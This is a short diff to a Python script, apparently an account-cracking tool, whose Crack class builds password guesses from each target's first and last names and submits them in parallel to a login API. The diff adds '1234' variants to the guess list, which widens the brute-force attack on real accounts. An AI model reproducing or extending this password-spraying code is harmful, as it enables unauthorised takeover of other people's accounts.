@@ -1,5 +1,7 @@
 ###----------[ IMPORT MODULE LAIN ]---------- ###
+
 import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
+
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 from datetime import date,datetime
@@ -421,6 +423,7 @@ class Crack:
 								pass 
 							else:
 								pwx.append(depan+"123")
+								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 						else:
 							if len(depan)<3:
@@ -428,6 +431,7 @@ class Crack:
 							else:
 								pwx.append(nama)
 								pwx.append(depan+"123")
+								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 							belakang = nama.split(" ")[1]
 							if len(belakang)<3:
@@ -435,6 +439,7 @@ class Crack:
 							else:
 								pwx.append(depan+belakang)
 								pwx.append(belakang+"123")
+								pwx.append(belakang+"1234")
 								pwx.append(belakang+"12345")
 						fall.submit(self.metode_api,user,pwx)
 					except:
